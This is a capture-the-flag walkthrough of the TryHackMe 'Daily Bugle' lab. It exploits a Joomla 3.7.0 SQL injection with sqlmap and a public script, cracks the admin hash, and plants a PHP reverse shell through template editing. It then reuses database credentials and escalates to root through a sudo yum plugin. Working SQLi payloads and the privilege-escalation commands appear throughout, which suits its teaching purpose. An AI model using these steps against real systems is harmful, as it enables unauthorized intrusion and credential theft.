---
title: THM - Daily Bugle
tags: [thm, joomla cms, joomla revshell, sqli]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/5a1494ff275a366be8418a9bf831847c.png" alt="Challenge logo" style="height:150px;">
</div>

Start the machine and access their VPN. As usual, we will start with a simple nmap scan

```
$ nmap -sC -sV 10.10.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (EdDSA)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:DB:D1:95:4A:0F (Unknown)
```

Only three open ports: 22, 80 and 3306. We will start from the web server since it could be the most likely point of access.

![](/assets/img/daily-bugle-web-server.PNG) 

From the nmap scan we can see that we can read the content of `robots.txt`. The most interesting entry is obviously `/administrator`. Let's navigate to it.

![](/assets/img/daily-bugle-joomla.PNG) 

Joomla default login page. Let's gather some useful information about the CMS. 

We can try to search for Joomla manifest at `/administrator/manifests/files/joomla.xml`

![](/assets/img/daily-bugle-joomla-manifest.PNG) 

We find that Joomla's version is `3.7.0`. Let's search for some knwon vulnerabilities

```
$ searchsploit joomla 3.7.0

--------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                             | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                          | php/webapps/43488.txt
--------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

The first one is classified as CVE-2017-8917 and is caused by a new component, `com_fields`, which was introduced in this version. Looking at the source code of the exploit, we can see that we can confirm this vulnerability with sqlmap.

```
$ sqlmap -u "http://10.10.24.96/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

After a little bit of testing, sqlmap reported that the parameter `list[fullordering]` is vulnerable to these types of SQL Injection

```
---
Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (3278=3278) THEN 3278 ELSE 3278*(SELECT 3278 FROM DUAL UNION SELECT 2033 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 5583 FROM(SELECT COUNT(*),CONCAT(0x7170707671,(SELECT (ELT(5583=5583,1))),0x7162786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))RzgG)
---
[10:35:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0
```

With this scan we were able to find some other useful information like MySQL version, Apache version, PHP version and the OS running on the machine. After a little online search I was able to find [this](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) python exploit. Let's try it

```
$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
$ python joomblah.py http://10.10.24.96

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

We succesfully found the user `jonah` and his hashed password. Let's crack it with John The Ripper

```
$ echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

spiderman123     (?)
```

We can try to log into the Joomla administration tool with the credentials we just found.

![](/assets/img/daily-bugle-admin-dashboard.PNG) 

One we are logged in the application, we can follow [this](https://www.hackingarticles.in/joomla-reverse-shell/) useful guide on how to spawn a revshell from the Joomla administrator page.

Go to "Extension > Templates > Templates" and click on the currently active one. We can now view and modify all the source files of the application.

![](/assets/img/daily-bugle-edit-template.PNG) 

I'll edit `index.php` but you can choose the page you like most. Overwrite its content with the revshell source code (remember to edit the IP address and the port) and click on "Save & Close". Now you have to setup a netcat listener and refresh the page you just modify.

```
nc -lnvp 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from 10.10.24.96 49750 received!
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:47:53 up 15 min,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```

Let's stabilize our shell

```
sh-4.2$ which python
/usr/bin/python
sh-4.2$ python -c 'import pty; pty.spawn("bin/bash");'
bash-4.2$ ^Z
$ stty raw -echo
$ fg
bash-4.2$ export TERM=xterm
bash-4.2$ whoami

apache
```

We are a low privileges user. Let's see if in the `/var/www/html` are any configuration files with plaintext credentials.

```
bash-4.2$ cd /var/www/html
bash-4.2$ ls
LICENSE.txt    cli		  includes   media	 tmp
README.txt     components	  index.php  modules	 web.config.txt
administrator  configuration.php  language   plugins
bin	       htaccess.txt	  layouts    robots.txt
cache	       images		  libraries  templates
```

`configuration.php` looks interesting. Let's see its content

```
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';

[...snip...] 
```

With these credentials we can access `mysql` but there are no interesting information. We can see which other users are present inside this machine.

```
bash-4.2$ ls -l /home

jjameson
```

`jjameson` is a user. Let's see if the credentials we just found are reused for him

```
bash-4.2$ su jjameson
Password:
[jjameson@dailybugle html]$   
```

Password reuse the old-fashioned way. Let's get the user flag

```
[jjameson@dailybugle html]$ cat /home/jjameson/user.txt
27a260fe3cba712cfdedb1c8[redacted] 
```

We have to elevate our privileges one more time. Let's see which commands we can execute with sudo

```
[jjameson@dailybugle html]$ sudo -l

Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

`yum` looks fishy. Search it into [GFTObins](https://gtfobins.github.io/gtfobins/yum/#sudo). We can spawn root shell by loading a custom plugin! Let's try it

```
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF

[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF

[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF

[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# 
sh-4.2# whoami
root
```

We are root! Let's get the flag.

```
sh-4.2# cat /root/root.txt
eec3d53292b1821868266858[redacted] 
```